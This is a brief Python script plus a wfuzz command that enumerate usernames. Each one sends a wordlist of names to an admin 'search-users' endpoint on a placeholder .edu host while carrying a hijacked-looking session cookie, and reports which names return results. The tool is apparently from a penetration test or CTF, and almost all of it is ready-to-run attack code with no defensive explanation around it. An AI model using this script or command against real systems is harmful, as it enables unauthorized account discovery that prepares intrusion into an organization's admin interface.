#####################################
##
##

import sys, os, time, requests

url = "http://anything.edu.org/admin/search-users?username="
peoples = sys.argv[1]

users = open(peoples, 'r')
for user in users.readlines():
	user = user.strip('\n')
	try:
		
		main_url = url+user
		headers = {"Cookie": "connect.sid=s%3asfkasdflknasd;fasdfasdfklbAGf_.asdfasdfasDEFSDFsSDFSXXXXXdftsxsPRes"}
		re = requests.get(main_url, headers=headers)
		if re.status_code == 200:
			if "No results for your search" not in re.text:
				print("[+] user: %s"%user)
	except Exception as e:
			print("[*] %s"%e)
			
      
#####################################
##
##


###
### wfuzz -c --hc=404 -H "Cookie: connect.sid=s%3xxxSDFSDFSDFSDFSDF1241235532333xxxxx" -u "http://thing.edu/admin/search-users/?username=FUZZ" -w /usr/share/seclists/Usernames/Names/names.txt -t 200 --hh=1074 -L
